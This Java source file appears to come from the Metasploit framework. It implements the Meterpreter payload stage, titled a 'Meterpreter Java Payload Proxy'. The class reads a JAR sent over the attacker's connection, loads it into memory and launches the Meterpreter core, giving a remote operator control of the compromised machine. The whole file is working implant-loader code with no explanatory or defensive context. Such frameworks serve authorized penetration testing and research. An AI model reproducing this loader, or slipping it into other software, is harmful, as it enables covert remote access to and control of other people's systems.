package javapayload.stage;

import java.io.DataInputStream;
import java.io.OutputStream;
import java.net.URL;
import java.net.URLClassLoader;

import metasploit.Payload;

import com.metasploit.meterpreter.JarFileClassLoader;

/**
 * Meterpreter Java Payload Proxy
 */
public class Meterpreter implements Stage  {

    public void start(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
        boolean noRedirectError = parameters[parameters.length - 1].equals("NoRedirect");
        int coreLen = in.readInt();
        byte[] core = new byte[coreLen];
        in.readFully(core);
        JarFileClassLoader loader = new JarFileClassLoader(getClass().getClassLoader());
        loader.addJarFile(core);
        Class meterpCore = loader.loadClass("com.metasploit.meterpreter.Meterpreter");
        meterpCore.getConstructor(new Class[]{DataInputStream.class, OutputStream.class, boolean.class, boolean.class}).newInstance(in, out, Boolean.TRUE, Boolean.valueOf(!noRedirectError));
        in.close();
        out.close();
    }
}
